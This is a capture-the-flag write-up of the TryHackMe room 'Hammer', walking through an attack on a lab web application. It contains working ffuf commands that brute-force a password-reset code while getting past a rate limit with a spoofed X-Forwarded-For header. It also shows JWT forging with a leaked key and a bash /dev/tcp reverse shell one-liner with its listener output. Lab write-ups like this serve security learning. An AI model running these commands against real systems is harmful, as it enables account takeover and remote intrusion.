---
title: "TryHackMe - Hammer"
author: Nasrallah
description: ""
date:  00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, jwt, ffuf]
img_path: /assets/img/tryhackme/hammer
image:
    path: hammer.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Hammer](https://tryhackme.comr/r/room/hammer) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9d:0e:ad:74:e4:c2:50:52:b6:be:66:5c:5d:0f:ae:41 (RSA)
|   256 72:80:68:5e:ed:db:e4:29:c9:73:76:88:41:03:cc:08 (ECDSA)
|_  256 0e:42:88:82:fd:7e:0f:60:0c:32:a0:20:02:bf:e3:fe (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We found 2 open ports, 22 running OpenSSH and 1337 Running Apache web server.

### Web

Let's navigate to the website.

![loginpage](1.png)

We got a login page here, no default credentials work neither sql injection.

I check the source code and found the following.

![directory_naming_convention](2.png)

We got a naming convention of the web directories.

Let's run a directory scan.

```bash
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.168.191:1337/hmr_FUZZ
```

```terminal

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.168.191:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 120ms]
images                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 115ms]
js                      [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 143ms]
logs                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 306ms]
```

We found the interesting directory `/hmr_logs`.

Navigating to that directory we find a log file leaking an email address.

![email](3.png)

We can use this email address with the reset password function.

After submitting the email we get the following page.

![recovery_code](4.png)

We need to submit a recovery code of four numbers that is sent to the email, but we can try brute forcing the code.

Let's check the request on burp.

![brup](5.png)

We make a post request to `reset_password.php` with the parameters `recovery_code` and `s`.
> s stands for the seconds left before the code gets expired.

We can also notice another interesting header on the response.

![retelimit](6.png)

There is a rate limit with a number that decreases every request, when reaching 0 we get the message `Rate limit exceeded. Please try again later.`

To bypass this rate limit we can add the `X-Forwarded-For` header.

![x-forwarded-for](7.png)

We managed to bypass the limit, not only that but we are not even required to enter an ip address, a number just works. Let's start the attack,

Let's create a list of 4 numbers.

```bash
seq 1000 9999 > nums.txt
```

Now we use craft our ffuf command.

```bash
ffuf -c -X POST -w nums.txt -u "http://10.10.168.191:1337/reset_password.php" -d "recovery_code=FUZZ&s=337" -H "Cookie: PHPSESSID=lk587499qccskudk8o7jm1k63u" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: FUZZ" -fr "Invalid or expired recovery code"
```

You need to make a request to `reset password` page and copy the PHPSESSID for the command above.

```terminal
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.168.191:1337/reset_password.php
 :: Wordlist         : FUZZ: /home/sirius/ctf/thm/hammer/nums.txt
 :: Header           : Cookie: PHPSESSID=lk587499qccskudk8o7jm1k63u
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : X-Forwarded-For: FUZZ
 :: Data             : recovery_code=FUZZ&s=337
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid or expired recovery code
________________________________________________

7650                    [Status: 200, Size: 2191, Words: 595, Lines: 53, Duration: 175ms]

```

We got the code, now let's submit it.

![reset](8.png)

Change the password and log in to the page.

![dashboard](9.png)

## **Foothold**

On the dashboard we find a form to submit a command. Submitting `whoami` we get a `command not allowed` and after a bit we get logged off automatically.

Let's continue on burp.

![burp](10.png)

We notice a `JWT` token and a `persistentSession` cookie which is probably the one responsible for logging us off.

Let's copy the JWT token and decode it on <https://jwt.io>

![jwt](11.png)

We can see a `role` and `kid` keys that we can probably change.

Going back to the command functionality, one command that managed to give us output is `ls`.

![ls](12.png)

We found the key `188ade1.key`.

```bash
curl http://10.10.168.191:1337/188ade1.key
56058354efb3daa97ebab00fabd7a7d7
```

Now let's got back the the JWT and edit it.

![adminjtw](13.png)

Now we copy the encoded token and use it in burp.

![burp](14.png)

We managed now to execute os commands, let's get a shell.

```bash
bash -c '/bin/bash -i >& /dev/tcp/10.14.91.207/9001 0>&1'
```

```terminal
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.14.91.207] from (UNKNOWN) [10.10.168.191] 58198
bash: cannot set terminal process group (749): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-168-191:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-10-168-191:/var/www/html$
```

Here ends the room with no privilege escalation unfortunately.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References
